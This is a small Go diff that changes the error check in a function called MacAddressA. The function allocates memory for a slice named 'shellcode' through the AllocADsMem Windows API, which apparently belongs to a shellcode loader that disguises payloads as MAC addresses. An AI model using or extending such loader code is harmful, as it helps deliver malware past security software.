@@ -10,7 +10,7 @@ import (
 
 func MacAddressA(shellcode []string) {
 	addr, _, err := wdll.AllocADsMem().Call(uintptr(len(shellcode) * 6))
-	if addr == 0 || err.Error() != "The operation completed successfully." {
+	if addr == 0 {
 		log.Fatalf("AllocADsMem() err: %v", err)
 	}
 
